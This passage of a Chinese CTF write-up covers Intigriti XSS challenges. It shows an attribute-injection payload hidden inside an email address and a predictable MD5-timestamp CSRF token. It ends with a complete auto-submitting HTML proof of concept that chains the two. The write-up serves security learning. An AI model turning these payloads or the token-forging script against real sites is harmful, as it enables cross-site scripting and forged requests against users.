㳚 —— U+3EDA + 'ta'  ===&gt; &lt;da+'ta'  ===&gt;  &lt;data
```

最终payload为：

```
∢㺪㳚ta%20id=result㺪㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)㺪&amp;autosubmit
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010ddf87c3601173b2.png)



## 0x04 xss challenge 0321

地址： [https://challenge-0321.intigriti.io/](https://challenge-0321.intigriti.io/%EF%BC%8C%E8%A6%81%E6%B1%82%E5%A6%82%E4%B8%8B%EF%BC%9A)，有如下要求：
- 使用最新版的Firefox或者Chrome浏览器
- 通过`alert()`弹出 flag`{`THIS_IS_THE_FLAG`}`
- 利用此页面的xss漏洞
- 不允许self-XSS 和 MiTM 攻击
### <a class="reference-link" name="%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"></a>思路分析

查看网页源码，`view-source:https://challenge-0321.intigriti.io/`，无法访问：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0156d400baaf313934.png)

不过用Devtools可以查看，通过对网页功能进行简要测试，发现在输入框中，可以输入和保存notes，输入也是实时更新在html页面中，同时带有特定的CSRF值：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016ebd095c7d1c3d13.png)

因为`contenteditable`属性允许用户直接修改html中的元素内容，详见：[https://html.spec.whatwg.org/multipage/interaction.html#attr-contenteditable](https://html.spec.whatwg.org/multipage/interaction.html#attr-contenteditable)

此外，经过大量的字符测试，发现网页有一个特殊的特性。例如我们输入`ftp://attack.com`或者`http://attack.com`这类带有协议名的特殊输入并保存，网页会生成一个特定的`&lt;a ...&gt;`标签：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010c4aa507cf62d82e.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fff028a0c2e513f0.png)

这样我们便有了一个可控的标签，输入一些特殊字符尝试构造闭合，发现网页对`'` `"`等特殊字符进行了过滤，进行了截断，无法与包含协议名的payload构造为一个整体形成构造闭合：

[![](https://p0.ssl.qhimg.com/t01d1717da6c8b6a9f3.png)](https://p0.ssl.qhimg.com/t01d1717da6c8b6a9f3.png)

通过将更改POST数据中`csrf` `notes`的类型（加上`[]` ，这是曾经做CTF题型时学习到的一个思路），可以看到一些有趣的信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0153db641226409904.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0105946a5861e69123.png)

这里发现对于`notes`的输入是由PHP`htmlspecialchars()`过滤的，这里查询了相关资料，并进行了字符集的测试，发现了类似于邮箱的地址`[xss@attack.com](mailto:xss@attack.com)`可以被成功输入，并且也能使网页自动添加`&lt;a ...&gt;` ：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015c5e601488c25f35.png)

通过[RFC2822](https://tools.ietf.org/html/rfc2822) 可以知道，邮箱名中可以包含很多特殊的字符，例如`"xss"[@attack](https://github.com/attack).com`依然可以被认定为一个合法的邮箱地址，并能够构造闭合，让我们控制标签内容：

[![](https://p1.ssl.qhimg.com/t01ec2c099ff4459d74.png)](https://p1.ssl.qhimg.com/t01ec2c099ff4459d74.png)

构造payload：`"onclick=alert(1);"[@attack](https://github.com/attack).com`，即可实现self-xss:

[![](https://p1.ssl.qhimg.com/t01e248ed75c1964330.png)](https://p1.ssl.qhimg.com/t01e248ed75c1964330.png)

由于题目不允许self-xss，所以我们需要从绕过csrf的角度入手，实现无需交互的xss。如果csrf令牌不正确，则会显示403：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ad9c6a33eaaf2334.png)

我们知道csrf令牌都是动态生成的，通常情况下该令牌可以由时间戳的加密哈希或者一些随机输入的加密哈希生成。这里我们坚持页面源码注意到包含页面的生成时间：

```
&lt;input type="hidden" name="csrf" value="f20927170100763667bf20d684f36515"/&gt;
...

...
&lt;!-- page generated at 2021-04-21 13:43:41 --&gt;
```

经过测试将日期转为时间戳并通过MD5加密，得到了相同的结果，由此，便可以绕过csrf的限制：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014d29a5276d359500.png)

现在，我们需要能够进行MD5加密的JS，可以从以下地址获得：

```
# CryptoJS.MD5()

https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js
https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js
```

为了保证我们生成的csrf令牌与网页自动生成的一直，需要查看攻击服务器的时间戳与题目网页时间戳之间的误差：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015b86f3d4f8557d47.png)

可以看到两个时间戳之间存在8小时时差，通过调整，可以使攻击服务器生成了csrf令牌与网页生成的令牌一致：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016197c06a6b29b03a.png)

### <a class="reference-link" name="POC"></a>POC

综合上面的思路，可以构造以下poc：

```
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;xss&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;iframe src="https://challenge-0321.intigriti.io/" width="1000" height="1000"&gt;&lt;/iframe&gt;
    &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"&gt;&lt;/script&gt;
    &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"&gt;&lt;/script&gt;
    &lt;form method="POST" action="https://challenge-0321.intigriti.io/" id="send"&gt;
        &lt;input type="hidden" name="csrf" id="csrf" value=""&gt;
        &lt;input type="hidden" id="payload" name="notes" value=""&gt;
    &lt;/form&gt;
    &lt;script&gt;
        var ts0 = Date.parse(new Date());
        var ts1 = String(ts0).substring(0,10);
        var passhash = CryptoJS.MD5(ts1).toString();
        function add0(m)`{`return m&lt;10?'0'+m:m `}`
        function format(date)`{`
          var time = new Date(date);
          var y = time.getFullYear();
          var m = time.getMonth()+1;
          var d = time.getDate();
          var h = time.getHours()-8;
          var mm = time.getMinutes();
          var s = time.getSeconds();
          dd = y+'-'+add0(m)+'-'+add0(d)+' '+add0(h)+':'+add0(mm)+':'+add0(s);
          return dd;
        `}`
        console.log(format(ts0));
        console.log(ts0);
        console.log(ts1);
        console.log(passhash); 
        setTimeout(xss, 100)；
        function xss()`{`
          document.getElementById("csrf").value = passhash;
          document.getElementById("payload").value = "\"onmouseover=alert('flag`{`THIS_IS_THE_FLAG`}`');\"@attack.com";
          document.getElementById("send").submit();
          `}`
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01645f1281c649fe5b.png)
